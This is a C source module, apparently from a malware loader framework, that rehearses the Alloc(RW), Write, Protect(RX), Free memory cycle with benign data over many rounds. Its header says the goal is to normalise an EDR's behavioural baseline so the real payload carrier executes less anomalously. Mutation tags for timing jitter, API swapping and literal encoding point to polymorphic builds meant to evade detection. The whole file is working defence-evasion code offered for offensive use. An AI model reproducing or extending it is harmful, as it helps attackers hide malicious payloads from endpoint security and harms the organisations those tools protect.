/* MODULE: DECONDITIONER
 * TYPE: alloc_loop
 * DESC: Rehearses the carrier's Alloc(RW) → Write → Protect(RX) → Free loop
 *       with benign data for DECON_ROUNDS iterations. Normalizes the EDR's
 *       behavioral baseline so the real carrier execution is less anomalous.
 * MUTATIONS: loop_mutation, timing_jitter, api_swap, literal_encoding, loop_restructuring, protection_transition
 */
#include "../header/definitions.h"

#ifndef DECON_ROUNDS
#define DECON_ROUNDS 20
#endif

void deconditioner() {
    DWORD old_prot;

    // @MUTATE:loop_mutation(fixed->GetTickCount_modulo)
    // @MUTATE:loop_restructuring(for->while|unroll)
    // @MUTATE:literal_encoding
    for (int i = 0; i < DECON_ROUNDS; i++) {

        // @MUTATE:api_wrapper_injection(VirtualAlloc)
        // @MUTATE:literal_encoding
        char *buf = (char*)VirtualAlloc(NULL, PAYLOAD_LEN, 0x3000, p_RW);
        if (!buf) continue;

        // Fill with benign data (same size as real payload)
        // @MUTATE:logic_mutation(memory_write->cpu_math)
        // @MUTATE:literal_encoding
        for (int k = 0; k < PAYLOAD_LEN; k++) {
            buf[k] = (char)(k ^ (i + 0x41));
        }

        // @MUTATE:timing_jitter
        // @MUTATE:protection_transition
        // @MUTATE:api_wrapper_injection(VirtualProtect)
        VirtualProtect(buf, PAYLOAD_LEN, p_RX, &old_prot);

        // @MUTATE:timing_jitter
        // @MUTATE:api_swap(VirtualFree->alternative)
        // @MUTATE:literal_encoding
        VirtualFree(buf, 0, 0x8000);
    }
}
